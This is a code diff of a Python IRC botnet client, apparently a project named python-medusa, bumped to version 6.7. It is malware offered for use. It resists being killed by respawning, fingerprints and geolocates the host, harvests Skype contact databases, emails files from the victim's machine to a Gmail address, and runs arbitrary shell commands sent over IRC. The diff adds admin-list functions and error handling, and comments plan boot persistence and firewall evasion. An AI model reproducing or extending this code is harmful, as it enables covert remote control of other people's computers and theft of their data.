@@ -21,7 +21,6 @@ from StringIO import StringIO
 from modules.logging import logfile, log
 
 #TODO: make portscan timeout or cancellable
-#TODO: wrap in installer and make it run on boot (in /var/something)
 #TODO: make run fully interactive by capturing input and using p.write() or p.stdin()
 #TODO: modules:
 #       download    will download the file at the given url and save it to the host machine
@@ -30,7 +29,7 @@ from modules.logging import logfile, log
 #       openvpn     implement openvpn for firewall evasion
 #       reverse ssh ssh botnet implementation
 
-version = "6.6"                                                   # bot version
+version = "6.7"                                                   # bot version
 
 try:
     logfile(filename="/var/softupdated/bot_v%s.log" % version)                         # redirects bot output to logfile
@@ -49,7 +48,7 @@ allowed_sources = ["thesquash"]                                   # only accept 
 admin = 'thesquash'                                               # the nick to send privmsgs to by default
 
 hostname = socket.gethostname()                                   # host's hostname
-main_user = os.popen("stat -f '%u %Su' /dev/console | awk  '{print $2}'").read().strip()        # main user of the computer detected by current owner of /dev/console
+main_user = os.popen("stat -f '%Su' /dev/console").read().strip() # main user of the computer detected by current owner of /dev/console
 local_user = getpass.getuser()                                    # user the bot is running as
 
 nick = '[%s|%s]' % (main_user, hostname)                          # bot's nickname
@@ -80,7 +79,7 @@ Public Commands (main channel): \n
 ############ Flow functions
 
 def timeout_handler(signum, frame):                                           # handler for timeout exceptions
-    raise Exception("timedout %s %s" % (signum, frame))
+    raise Exception("Timeout Alarm: %s %s" % (signum, frame))
 
 def sigterm_handler(signum, frame):                                           # if user tries to kill python process, it will spawn another one
     log('[#] ----Host attempted to shutdown bot----')
@@ -242,11 +241,17 @@ def identify():                                                   # give some id
     else:
         log('[>]    OS X:    ',system)
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(("8.8.8.8",80))
-    local_ip = s.getsockname()[0]
-    s.close()
+    try:
+        s.connect(("8.8.8.8",80))
+        local_ip = s.getsockname()[0]
+        s.close()
+    except Exception as ip_error:
+        local_ip = ip_error
     log('[>]    Local:   ',local_ip)
-    public_ip = urllib2.urlopen('http://checkip.dyndns.org:8245/').read().split(": ")[1].split("<")[0].strip()
+    try:
+        public_ip = urllib2.urlopen('http://checkip.dyndns.org:8245/').read().split(": ")[1].split("<")[0].strip()
+    except Exception as url_error:
+        public_ip = url_error
     log('[>]    Public:  ',public_ip)
     mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
     log('[>]    MAC:     ',mac_addr)
@@ -271,13 +276,18 @@ def full_identify():                                              # give verbose
     privmsg('[>]      User:    %s' % main_user)
 
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(("8.8.8.8",80))
-    local_ip = s.getsockname()[0]
-    s.close()
+    try:
+        s.connect(("8.8.8.8",80))
+        local_ip = s.getsockname()[0]
+        s.close()
+    except Exception as ip_error:
+        local_ip = ip_error
     log('[>]    Local:   ',local_ip)
     privmsg('[>]      Local:   %s' % local_ip)
-
-    public_ip = urllib2.urlopen('http://checkip.dyndns.org:8245/').read().split(": ")[1].split("<")[0].strip()
+    try:
+        public_ip = urllib2.urlopen('http://checkip.dyndns.org:8245/').read().split(": ")[1].split("<")[0].strip()
+    except Exception as url_error:
+        public_ip = url_error
     log('[>]    Public:  ',public_ip)
     privmsg('[>]      Public:  %s' % public_ip)
     
@@ -302,7 +312,7 @@ def full_identify():                                              # give verbose
     privmsg('[>]      Location:    %s' % location)
 
     try:
-        db_path = skype.findProfiles(local_user)
+        db_path = skype.findProfiles(main_user)
         log('[>]    Skype:    ')
         privmsg('[>]      Skype:')
         for line in skype.skypeProfile(db_path):
@@ -463,9 +473,18 @@ def selfupdate(git_user="nikisweeting",git_repo="python-medusa"):   # updates th
     sleep(1)
     reload_bot()
 
+def admin(admins):
+    for entry in admins:
+        allowed_sources.append(entry)
+
+def unadmin(admins):
+    for entry in admins:
+        if entry in allowed_sources:
+            allowed_sources.remove(entry)
+
 ############ The beef of things
 if __name__ == '__main__':
-    if len(nick) > 15: nick = '[%s]' % (main_user[:13])          # if nick is over 15 characters, change to username truncated at 13 chars
+    if len(nick) > 15: nick = '[%s]' % (main_user[:13])           # if nick is over 15 characters, change to username truncated at 13 chars
     last_ping = time.time()                                       # last ping recieved
     threshold = 8 * 60                                            # maximum time between pings before assuming disconnected (in seconds)
     quit_status = False
@@ -503,17 +522,17 @@ if __name__ == '__main__':
             while not quit_status and (timeout_count < 50):          # if timeout_count is above 50, reconnect
                 if (last_data == data):                              # IRC servers  will occasionally send lots of blank messages instead of disconnecting
                     timeout_count += 1
-                last_data = data
+                last_data = data                
+
                 try:
                     data = irc.recv(4096)
                     log('[+] Recieved:')
                     log('[>]    ', data.strip())
+                    timedout_count = 0
                 except socket.timeout:
-                    if (time.time() - last_ping) > threshold:        # if reciving data times out and ping threshold is exceeded, attempt a reconnect
-                        log('[*] Disconnected.')
-                        timedout_count = 50
-                        quit_status = False
-                        break
+                    if time.time() - last_ping > threshold:          # if reciving data times out and ping threshold is exceeded
+                        timedout_count += 5
+                        pass
                     else:
                         data = str(time.time())
                         timedout_count = 0
@@ -568,7 +587,7 @@ if __name__ == '__main__':
                         elif content[:6] == 'email$':
                             attch = content[6:].split(',')
                             to = "nikisweeting+bot@gmail.com"
-                            broadcast(email(to,msg="whohooo",sbj='BOT: '+nick,attch=attch))
+                            broadcast(communication.email(to,msg="whohooo",sbj='BOT: '+nick,attch=attch))
 
                         elif content == '!geo':
                             location = str(geo_locate())
@@ -643,7 +662,7 @@ if __name__ == '__main__':
 
                         elif content == 'skype$contacts':
                             try:
-                                db_path = skype.findProfiles(local_user)
+                                db_path = skype.findProfiles(main_user)
                                 for line in skype.skypeProfile(db_path):
                                     privmsg(line, to=return_to)
                                     sleep(1)
@@ -668,16 +687,19 @@ if __name__ == '__main__':
 
                         elif content[:6] == 'admin$':
                             admins = content[6:].split(',')
-                            for entry in admins:
-                                allowed_sources.append(entry)
+                            admin(admins)
                             privmsg("Admin List: %s" % allowed_sources)
 
                         elif content[:8] == 'unadmin$':
                             admins = content[8:].split(',')
-                            for entry in admins:
-                                if entry in allowed_sources:
-                                    allowed_sources.remove(entry)
+                            unadmin(admins)
                             privmsg("Admin List: %s" % allowed_sources)
+
+                        elif content[:6] == 'email$':
+
+                            attch = content[6:].split(',')
+                            to = "nikisweeting+bot@gmail.com"
+                            broadcast(communication.email(to,msg="whohooo",sbj='BOT: '+nick,attch=attch))
 
                         elif content[:1] == '$':
                             cmd = content[1:]
